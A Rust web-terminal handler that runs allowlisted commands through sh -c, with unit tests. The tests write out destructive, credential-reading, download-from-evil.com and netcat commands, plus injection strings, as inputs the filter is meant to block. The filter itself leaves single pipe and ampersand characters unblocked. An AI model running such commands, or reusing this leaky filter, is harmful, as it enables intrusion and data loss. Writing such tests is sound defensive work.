use axum::Json;
use serde::{Deserialize, Serialize};
use std::process::Command;

use crate::AppError;

/// Max command length to prevent abuse
const MAX_COMMAND_LEN: usize = 512;

/// Max output size (256KB)
const MAX_OUTPUT_SIZE: usize = 256 * 1024;

#[derive(Deserialize)]
pub struct ExecRequest {
    pub command: String,
}

#[derive(Serialize)]
pub struct ExecResponse {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
}

/// Allowed commands. Each entry is a base command that can optionally
/// accept additional flags (but NOT shell metacharacters).
const ALLOWED_BASES: &[&str] = &[
    "uname", "hostname", "uptime", "date", "whoami", "id",
    "free", "df", "top", "ps",
    "ip", "ss",
    "docker ps", "docker stats", "docker images", "docker network", "docker version",
    "systemctl status", "systemctl list-units",
    "journalctl",
    "lsusb", "lsblk", "lscpu",
    "ls", "pwd",
];

/// Commands allowed with exact match only (contain paths/pipes)
const ALLOWED_EXACT: &[&str] = &[
    "cat /etc/airwaves-release",
    "cat /etc/os-release",
    "cat /etc/hostname",
    "cat /etc/airwaves/config.json",
    "dmesg | tail",
    "dmesg | tail -50",
    "dmesg | tail -100",
];

/// Shell metacharacters that are NEVER allowed in non-exact commands
const BLOCKED_CHARS: &[&str] = &[
    ";", "&&", "||", "`", "$(", "${", ">", "<", "\n", "\r", "\\",
];

fn is_command_allowed(input: &str) -> bool {
    let trimmed = input.trim();

    if trimmed.is_empty() || trimmed.len() > MAX_COMMAND_LEN {
        return false;
    }

    // Exact match (for commands with pipes/paths)
    if ALLOWED_EXACT.contains(&trimmed) {
        return true;
    }

    // Block all shell metacharacters for non-exact commands
    for ch in BLOCKED_CHARS {
        if trimmed.contains(ch) {
            return false;
        }
    }

    // Base command prefix match
    for base in ALLOWED_BASES {
        if trimmed == *base {
            return true;
        }
        if trimmed.starts_with(base) {
            let rest = &trimmed[base.len()..];
            if rest.starts_with(' ') {
                return true;
            }
        }
    }

    false
}

pub async fn exec_command(Json(req): Json<ExecRequest>) -> Result<Json<ExecResponse>, AppError> {
    let input = req.command.trim().to_string();

    if input.len() > MAX_COMMAND_LEN {
        return Ok(Json(ExecResponse {
            exit_code: 1,
            stdout: String::new(),
            stderr: "Command too long".to_string(),
        }));
    }

    // Built-in commands
    match input.as_str() {
        "help" => {
            let mut help = String::from("Airwaves OS Web Terminal\n\nAllowed commands:\n");
            for cmd in ALLOWED_BASES {
                help.push_str(&format!("  {} [flags]\n", cmd));
            }
            help.push_str("\nExact commands:\n");
            for cmd in ALLOWED_EXACT {
                help.push_str(&format!("  {}\n", cmd));
            }
            help.push_str("\nType 'clear' to clear the screen.");
            return Ok(Json(ExecResponse {
                exit_code: 0,
                stdout: help,
                stderr: String::new(),
            }));
        }
        "clear" => {
            return Ok(Json(ExecResponse {
                exit_code: 0,
                stdout: String::new(),
                stderr: String::new(),
            }));
        }
        _ => {}
    }

    if !is_command_allowed(&input) {
        return Ok(Json(ExecResponse {
            exit_code: 1,
            stdout: String::new(),
            stderr: format!(
                "Permission denied: '{}' is not allowed.\nType 'help' for available commands.",
                input
            ),
        }));
    }

    // Execute with spawn_blocking to avoid blocking the async runtime
    let output = tokio::task::spawn_blocking(move || {
        Command::new("sh")
            .args(["-c", &input])
            .output()
    })
    .await
    .map_err(|e| AppError::Internal(format!("Task failed: {}", e)))?
    .map_err(|e| AppError::Internal(format!("Exec failed: {}", e)))?;

    // Truncate output if too large
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    let stdout = if stdout.len() > MAX_OUTPUT_SIZE {
        format!("{}...\n[truncated at {} bytes]", &stdout[..MAX_OUTPUT_SIZE], MAX_OUTPUT_SIZE)
    } else {
        stdout.to_string()
    };

    let stderr = if stderr.len() > MAX_OUTPUT_SIZE {
        format!("{}...\n[truncated]", &stderr[..MAX_OUTPUT_SIZE])
    } else {
        stderr.to_string()
    };

    Ok(Json(ExecResponse {
        exit_code: output.status.code().unwrap_or(-1),
        stdout,
        stderr,
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exact_commands_allowed() {
        assert!(is_command_allowed("cat /etc/airwaves-release"));
        assert!(is_command_allowed("dmesg | tail"));
        assert!(is_command_allowed("cat /etc/os-release"));
    }

    #[test]
    fn test_base_commands_allowed() {
        assert!(is_command_allowed("uname"));
        assert!(is_command_allowed("uname -a"));
        assert!(is_command_allowed("df -h"));
        assert!(is_command_allowed("docker ps"));
        assert!(is_command_allowed("docker ps -a"));
        assert!(is_command_allowed("ps aux"));
        assert!(is_command_allowed("top -bn1"));
        assert!(is_command_allowed("journalctl -n 50"));
        assert!(is_command_allowed("ip addr"));
    }

    #[test]
    fn test_dangerous_commands_blocked() {
        assert!(!is_command_allowed("rm -rf /"));
        assert!(!is_command_allowed("cat /etc/shadow"));
        assert!(!is_command_allowed("wget http://evil.com/payload"));
        assert!(!is_command_allowed("curl http://evil.com"));
        assert!(!is_command_allowed("bash"));
        assert!(!is_command_allowed("sh"));
        assert!(!is_command_allowed("nc -l 4444"));
    }

    #[test]
    fn test_injection_attempts_blocked() {
        assert!(!is_command_allowed("uname; rm -rf /"));
        assert!(!is_command_allowed("uname && cat /etc/shadow"));
        assert!(!is_command_allowed("uname || wget evil.com"));
        assert!(!is_command_allowed("uname `id`"));
        assert!(!is_command_allowed("uname $(id)"));
        assert!(!is_command_allowed("uname > /etc/crontab"));
        assert!(!is_command_allowed("cat /etc/passwd < /dev/null"));
    }

    #[test]
    fn test_empty_and_long_commands() {
        assert!(!is_command_allowed(""));
        assert!(!is_command_allowed("   "));
        assert!(!is_command_allowed(&"a".repeat(MAX_COMMAND_LEN + 1)));
    }
}
